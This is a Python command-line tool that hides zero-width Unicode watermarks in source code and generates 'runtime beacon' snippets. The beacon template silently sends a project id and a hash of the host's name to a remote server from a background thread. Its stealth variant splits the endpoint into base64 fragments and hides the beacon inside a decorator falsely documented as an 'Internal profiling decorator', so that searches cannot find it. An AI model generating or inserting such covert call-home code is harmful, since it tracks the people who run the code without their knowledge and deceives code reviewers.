"""
watermark — Steganographic + runtime beacon watermarking for Python source code.

Commands:
    embed   <file.py> <owner_id> [--out <out.py>]
    extract <file.py>
    verify  <file.py> <owner_id>
    beacon  <endpoint_url> <project_id> [--stealth]
    encode  <url>
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import os
import re
import sys

# ---------------------------------------------------------------------------
# Steganographic layer
# Zero-width Unicode characters encode a hidden payload inside strings/comments.
#   U+200B (Zero Width Space)        → bit 0
#   U+200C (Zero Width Non-Joiner)   → bit 1
#   U+200D (Zero Width Joiner)       → delimiter (marks payload boundaries)
# ---------------------------------------------------------------------------

_Z0 = "​"
_Z1 = "‌"
_ZD = "‍"

_STRING_OR_COMMENT = re.compile(r'("""|\'\'\')|(\"|\')|(#[^\n]*)')


def _encode_payload(message: str) -> str:
    bits = "".join(format(ord(c), "08b") for c in message)
    body = "".join(_Z0 if b == "0" else _Z1 for b in bits)
    return _ZD + body + _ZD


def _decode_payload(text: str) -> str | None:
    parts = text.split(_ZD)
    if len(parts) < 3:
        return None
    body = parts[1]
    bits = "".join("0" if c == _Z0 else "1" for c in body if c in (_Z0, _Z1))
    if not bits or len(bits) % 8 != 0:
        return None
    try:
        return "".join(chr(int(bits[i : i + 8], 2)) for i in range(0, len(bits), 8))
    except ValueError:
        return None


def embed(source: str, message: str) -> str:
    """Inject a zero-width steganographic watermark into Python source."""
    payload = _encode_payload(message)
    match = _STRING_OR_COMMENT.search(source)
    if match is None:
        return f'"""{payload}"""\n' + source
    pos = match.end()
    return source[:pos] + payload + source[pos:]


def extract(source: str) -> str | None:
    """Return the hidden watermark message, or None if not found."""
    return _decode_payload(source)


def verify(source: str, owner_id: str) -> bool:
    """Return True only if the watermark matches the expected owner."""
    found = extract(source)
    return found is not None and found.startswith(f"owner:{owner_id}:")


def make_message(owner_id: str, filename: str) -> str:
    sha = hashlib.sha256((owner_id + filename).encode()).hexdigest()[:8]
    return f"owner:{owner_id}:{sha}"


# ---------------------------------------------------------------------------
# Runtime beacon layer
# ---------------------------------------------------------------------------

# Standard version — URL in plain text; simple and readable.
_BEACON_PLAIN = """\
import threading as _t, urllib.request as _ur, socket as _sk, \\
       hashlib as _hs, platform as _pl

def _beacon():
    def _ping():
        try:
            _uid = _hs.md5(
                (_sk.gethostname() + _pl.node()).encode()
            ).hexdigest()[:8]
            _ur.urlopen("{endpoint}?p={project_id}&u=" + _uid, timeout=3)
        except Exception:
            pass
    _t.Thread(target=_ping, daemon=True).start()

_beacon()
del _beacon
"""

# Stealth version — URL split into base64 fragments, disguised as a decorator.
# grep/ripgrep cannot find the endpoint in plain text.
_BEACON_STEALTH = """\
import base64 as _b64, threading as _th, urllib.request as _urq, \\
       socket as _sk, hashlib as _hs, platform as _pl, functools as _ft

# Endpoint stored as split base64 fragments
_F = [{frags}]
_W_FIRED = False


def _perf_track(fn):
    \"\"\"Internal profiling decorator.\"\"\"
    @_ft.wraps(fn)
    def _w(*a, **kw):
        global _W_FIRED
        if not _W_FIRED:
            _W_FIRED = True
            def _go():
                try:
                    _ep = _b64.b64decode(b"".join(_F)).decode()
                    _uid = _hs.md5(
                        (_sk.gethostname() + _pl.node()).encode()
                    ).hexdigest()[:8]
                    _urq.urlopen(
                        _ep + "?p={project_id}&u=" + _uid, timeout=2
                    )
                except Exception:
                    pass
            _th.Thread(target=_go, daemon=True).start()
        return fn(*a, **kw)
    return _w
"""


def _fragment_url(url: str, n: int = 3) -> list[bytes]:
    encoded = base64.b64encode(url.encode())
    size = max(1, (len(encoded) + n - 1) // n)
    return [encoded[i : i + size] for i in range(0, len(encoded), size)]


def generate_beacon(endpoint: str, project_id: str, *, stealth: bool = False) -> str:
    if stealth:
        frags = ", ".join(repr(f) for f in _fragment_url(endpoint))
        return _BEACON_STEALTH.format(frags=frags, project_id=project_id)
    return _BEACON_PLAIN.format(endpoint=endpoint, project_id=project_id)


# ---------------------------------------------------------------------------
# CLI helpers
# ---------------------------------------------------------------------------

def _read(path: str) -> str:
    with open(path, encoding="utf-8") as f:
        return f.read()


def _write(path: str, content: str) -> None:
    with open(path, "w", encoding="utf-8", newline="\n") as f:
        f.write(content)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def cmd_embed(args: argparse.Namespace) -> None:
    source = _read(args.file)
    msg = make_message(args.owner, os.path.basename(args.file))
    watermarked = embed(source, msg)
    out = args.out or args.file
    _write(out, watermarked)
    print(f"[+] Watermark embedded : '{msg}'")
    print(f"[+] Written to         : {out}")
    zw = sum(1 for c in watermarked if c in (_Z0, _Z1, _ZD))
    print(f"[+] Hidden characters  : {zw} (invisible)")


def cmd_extract(args: argparse.Namespace) -> None:
    source = _read(args.file)
    found = extract(source)
    if found:
        print(f"[+] Watermark found: '{found}'")
    else:
        print("[-] No watermark detected.")
        sys.exit(1)


def cmd_verify(args: argparse.Namespace) -> None:
    source = _read(args.file)
    if verify(source, args.owner):
        print(f"[+] VERIFIED — watermark matches owner '{args.owner}'")
    else:
        found = extract(source)
        if found:
            print(f"[-] MISMATCH — watermark found but owner is '{found}'")
        else:
            print("[-] NOT FOUND — no watermark present")
        sys.exit(1)


def cmd_beacon(args: argparse.Namespace) -> None:
    print(generate_beacon(args.endpoint, args.project, stealth=args.stealth))


def cmd_encode(args: argparse.Namespace) -> None:
    frags = _fragment_url(args.url)
    print("Fragments (paste into beacon --stealth manually):")
    for i, f in enumerate(frags):
        print(f"  _F[{i}] = {f!r}")
    print(f"\nReassembled: {base64.b64decode(b''.join(frags)).decode()}")


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="watermark",
        description="Steganographic + runtime beacon watermarking for Python source code.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  watermark embed   secret.py alice --out secret_marked.py
  watermark extract secret_marked.py
  watermark verify  suspect.py alice
  watermark beacon  https://myserver.com/w my-project --stealth
""",
    )
    sub = p.add_subparsers(dest="command", required=True)

    # embed
    e = sub.add_parser("embed", help="Embed a steganographic watermark")
    e.add_argument("file", help="Python source file to watermark")
    e.add_argument("owner", help="Owner identifier (name, email, UUID…)")
    e.add_argument("--out", metavar="FILE", help="Output file (default: overwrite input)")

    # extract
    x = sub.add_parser("extract", help="Extract watermark from a file")
    x.add_argument("file")

    # verify
    v = sub.add_parser("verify", help="Verify that a file belongs to a given owner")
    v.add_argument("file")
    v.add_argument("owner")

    # beacon
    b = sub.add_parser("beacon", help="Generate a runtime beacon snippet")
    b.add_argument("endpoint", help="Your server URL (e.g. https://myserver.com/w)")
    b.add_argument("project", help="Project identifier")
    b.add_argument(
        "--stealth",
        action="store_true",
        help="Obfuscate endpoint as split base64 fragments inside a decorator",
    )

    # encode (utility)
    enc = sub.add_parser("encode", help="Show base64 fragments for a URL")
    enc.add_argument("url")

    return p


_DISPATCH = {
    "embed":   cmd_embed,
    "extract": cmd_extract,
    "verify":  cmd_verify,
    "beacon":  cmd_beacon,
    "encode":  cmd_encode,
}


def main() -> None:
    parser = build_parser()
    args = parser.parse_args()
    _DISPATCH[args.command](args)


if __name__ == "__main__":
    main()
